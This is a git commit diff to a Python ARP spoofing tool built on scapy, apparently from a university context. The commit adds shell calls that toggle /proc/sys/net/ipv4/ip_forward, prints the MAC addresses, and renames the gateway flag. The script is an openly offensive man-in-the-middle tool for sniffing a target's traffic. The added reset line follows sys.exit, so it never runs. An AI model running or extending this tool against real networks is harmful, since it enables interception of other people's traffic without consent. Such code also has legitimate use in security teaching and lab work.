19b3b7727ae84d1de4d16d6c463d85a782f1904d
András Tarlós <andras.tarlos@ost.ch>
2025-11-11 11:12:13 +0100

    Made minor changes to arp_spoof

--- arp_spoof.py
+++ arp_spoof.py
@@ -2,16 +2,20 @@ import time
 import sys
 import logging
 import argparse
+import os
 from scapy.all import ARP, send, get_if_hwaddr, get_if_addr
 
 
 class ARPSpoofer:
     def __init__(self, target_ip, gateway_ip, interface):
+        os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
         self.target_ip = target_ip
         self.gateway_ip = gateway_ip
         self.interface = interface
         self.target_mac = self.get_mac(target_ip)
+        print(self.target_mac)
         self.gateway_mac = self.get_mac(gateway_ip)
+        print(self.gateway_mac)
         self.own_mac = get_if_hwaddr(self.interface)
 
     def get_mac(self, ip):
@@ -44,13 +48,15 @@ class ARPSpoofer:
         except KeyboardInterrupt:
             self.restore()
             sys.exit("ARP spoofing stopped")
+            os.system('echo 0 > /proc/sys/net/ipv4/ip_forward')
+
 
 if __name__ == "__main__":
     logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')
 
     parser = argparse.ArgumentParser(description="ARP Spoofing Tool to sniff network traffic.")
     parser.add_argument("-t", "--target", required=True, help="Target IP address to spoof.")
-    parser.add_argument("-s", "--gateway", required=True, help="Gateway IP address.")
+    parser.add_argument("-g", "--gateway", required=True, help="Gateway IP address.")
     parser.add_argument("-i", "--interface", required=True, help="Network interface to use (e.g., eth0, wlan0).")
 
     # Parse the arguments
